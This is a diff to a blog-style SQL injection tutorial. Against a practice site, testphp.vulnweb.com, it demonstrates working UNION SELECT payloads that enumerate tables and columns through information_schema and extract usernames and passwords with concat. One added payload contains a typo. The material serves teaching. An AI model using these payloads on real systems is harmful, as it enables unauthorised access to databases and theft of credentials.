@@ -311,10 +311,11 @@ Than go for <http://testphp.vulnweb.com/listproducts.php?cat=2-1> <br>We tried a
 If you observe the url, you can guess there is a table named `listproducts` and a column named `cat`.<br>
 Backend code may work like that:<br>
 ```sql
-SELECT * FROM listproducts WHERE cat=
+SELECT (some unknown column names) FROM listproducts WHERE cat=
 ```
 Of course those names are not the same like that
 at the source code, so we still do not know any names from the database.
+And of course it may not work like that, just like I said, it is guessing.
 <br>
 ### Finding the column count
 
@@ -372,12 +373,15 @@ As you can see I am getting the same error as the error on website when the numb
 After enumerating until 11, we finally returning to our referance point.Thus we can tell the table has 11 columns in total.
 Scroll down to the bottom, you should see someting different.
 <br>
+<http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,,8,9,10,11>
+<br>
 ![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql8.jpg)
 <br>
 There is one more entry right now. However we see 7, 2 and 9. It means that web application prints out the informations to the
 html document that contained in second, seventh and nineth columns in the table.<br>
 It means that we can run whatever we want in that areas to extract information from the database. For example lets run `version()`
 helper function at second, seventh or nienth column to see version of the server that running the database.
+<br>
 <br>
 <http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11>
 <br>
@@ -387,6 +391,90 @@ After this point of time, all the helper functions are available for you.You can
 sql query to only see your own query by selecting something non existent from the database.
 <br>
 <http://testphp.vulnweb.com/listproducts.php?cat=8217582175821%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11>
-### Finding the table name
-First of all we need to find the table name that we are going to extract
+### Extracting the table names
+First thing to do is to gather all the table names exists in the database.For MySQl it is `information_schema` which provides
+access to database metadata.We are going to use methods of that information_schema to enumerate the database. 
+Even though helper function's syntax or names will vary database to database, there is always a functionality doing
+the same thing with for different database.
+<br>
+```sql
+MariaDB [testdb]> SELECT table_name FROM information_schema.tables WHERE table_schema=database();
++------------+
+| table_name |
++------------+
+| users      |
++------------+
+```
+With `tables` method belongs to `information_schema`, we can query the table names.<br>
+Now lets imply this method to the acuart database.
+<br>
+<http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema=database()>
+![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql12.jpg)
+<br>
+Awesome, we got all the table names storing in the acurat db.
+### Extracting the column names
+Just like `tables`, there is also `columns` method belongs to `information_schema`.However, to use that target-spesific, first
+we needed to see table names. Otherwise it will bring all the columns exists in the database, such a mess.
+```sql
+MariaDB [testdb]> SELECT column_name FROM information_schema.columns WHERE table_name='users';
++---------------------+
+| column_name         |
++---------------------+
+| PersonID            |
+| LastName            |
+| FirstName           |
+| PersonID            |
+| FirstName           |
+| LastName            |
+| USER                |
+| CURRENT_CONNECTIONS |
+| TOTAL_CONNECTIONS   |
++---------------------+
+```
+Now lets imply this method to the acuart database. 
+<br>
+<http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name="users">
+![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql13.jpg)
+<br>
+We now have got all the column names in the 'users' table, 'uname' and 'pass' columns are intresting : )
+<br>
+## Extracting values from columns
+After this point, our aim is certain, and simple. We need to get 'uname' and 'pass' fields in users table.
+One simple query to get those values, for example just like this. 
+```sql
+MariaDB [testdb]> SELECT FirstName from users;
++-----------+
+| FirstName |
++-----------+
+| Burak     |
+| Burak2    |
+| Burak3    |
++-----------+
+```
+So lets imply this to acuart.
+<br>
+<http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,concat("Username:",uname, " Password:",pass),8,9,10,11 FROM users>
+![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql14.jpg)
+**Congrats !!** we got the username and password fields.
+### Concat method
+As you see above, I used concat for string formatting.Lets see how it is working from our example database.
+```sql
+MariaDB [testdb]> SELECT concat("FN:",FirstName, "  LN:",LastName) from users;
++-------------------------------------------+
+| concat("FN:",FirstName, "  LN:",LastName) |
++-------------------------------------------+
+| FN:Burak  LN:Baris                        |
+| FN:Burak2  LN:Baris2                      |
+| FN:Burak3  LN:Baris3                      |
++-------------------------------------------+
+```
+### Proof of concept
+As you remember, at the `Guessing the design` heading, we come up with a possible query that runs at the server
+just by observing the behaviour of the web application. After doing more scans in the database, I see that, that guess
+we made above, is kind of close to the real design.
 
+<http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,pshort,3,4,5,6,title,img,(SELECT aname FROM artists WHERE artist_id=1),10,(SELECT cname FROM categ WHERE cat_id=1) FROM pictures WHERE cat_id=1>
+<br>
+Gives the same result as:
+<br>
+<http://testphp.vulnweb.com/listproducts.php?cat=1>
